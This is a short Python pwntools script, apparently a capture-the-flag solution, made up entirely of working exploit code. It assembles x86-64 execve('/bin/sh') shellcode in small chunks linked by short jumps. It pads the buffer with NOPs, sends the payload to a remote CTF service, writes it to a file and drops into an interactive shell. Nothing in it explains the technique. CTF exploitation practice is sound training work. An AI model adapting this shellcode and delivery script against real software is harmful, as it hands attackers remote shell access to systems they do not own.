from pwn import *


inp = "\x48\x31\xC0\x90" # xor rax, rax
inp += "\xEB\x0a"

inp += "\xB0\x68\xB4\x00" # mov al, 0x68; mov ah, 0x00			1
inp += "\xEB\x0a"

inp += "\x48\xC1\xE0\x10" # shl rax, 16
inp += "\xEB\x0a"

inp += "\xB0\x2f\xB4\x73" # mov al, 0x2f; mov ah, 0x73			2
inp += "\xEB\x0a"

inp += "\x48\xC1\xE0\x10" # shl rax, 16
inp += "\xEB\x0a"

inp += "\xB0\x69\xB4\x6e" # mov al, 0x69; mov ah, 0x6e			3
inp += "\xEB\x0a"

inp += "\x48\xC1\xE0\x10" # shl rax, 16
inp += "\xEB\x0a"

inp += "\xB0\x2f\xB4\x62" # mov al, 0x2f; mov ah, 0x62			4
inp += "\xEB\x0a"

inp += "\x50\x48\x89\xE7" # push rax; mov rdi, rsp
inp += "\xEB\x0a"


inp += "\x48\x31\xC0\x90" # xor rax, rax
inp += "\xEB\x0a"

inp += "\x66\xB8\x3B\x00" # mov ax, 0x3b
inp += "\xEB\x0a"

inp += "\x90\x48\x31\xF6" # xor rsi, rsi
inp += "\xEB\x0a"

inp += "\x90\x48\x31\xD2" # xor rdx, rdx
inp += "\xEB\x0a"


inp += "\x90\x0F\x05\x90" # syscall


#r = process('./skippingrope')

r = remote('ctf.pwn.sg', 1501)

f = open('winning_input', 'w')

for i in range(0x5FA - len(inp)):
	inp += "\x90"

r.sendline(inp)
f.write(inp)
f.close()

r.interactive()

